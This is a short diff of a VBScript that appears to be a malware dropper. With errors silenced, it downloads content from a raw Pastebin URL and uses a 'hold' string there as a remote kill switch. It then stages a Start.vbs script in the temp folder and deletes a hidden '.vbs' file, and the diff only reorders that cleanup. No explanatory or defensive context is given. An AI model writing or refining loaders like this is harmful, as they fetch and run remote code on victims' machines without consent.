@@ -1,4 +1,7 @@
 On Error Resume Next
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+tmpPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\.vbs"
+objFSO.DeleteFile tmpPath
 Set objShell = CreateObject("WScript.Shell")
 Set oHTTP = CreateObject("MSXML2.XMLHTTP")
 oHTTP.open "GET", "https://pastebin.com/raw/knWXwasC", False
@@ -9,12 +12,7 @@ If InStr(tunnel, "hold") > 0 Then
 	WScript.Quit
 End If
 
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-
 tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\Start.vbs"
-tmpPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\.vbs"
-
-objFSO.DeleteFile tmpPath
 
 Set objFile = objFSO.CreateTextFile(tempPath, True)
 
